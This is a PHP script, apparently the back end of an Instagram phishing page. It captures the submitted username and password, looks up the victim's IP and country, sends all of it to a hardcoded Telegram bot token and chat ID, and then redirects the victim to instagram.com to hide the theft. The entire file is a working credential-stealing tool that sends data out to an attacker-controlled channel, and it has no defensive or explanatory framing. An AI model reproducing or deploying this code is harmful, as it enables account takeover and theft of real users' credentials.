<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    $country = file_get_contents('http://ip-api.com/json/'.$ip);
    $country = json_decode($country, true)['country'];

    $message = "Username: $username, Password: $password , IP: $ip, $country: Country";

    $botToken = "6580416979:AAFv1c9itpTIa7R4d7tVQU406HQZ0TksWHg";
    $chatID = "6618951105";

    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message";

    file_get_contents($url);
}
header("location: https://www.instagram.com");
exit;
?>
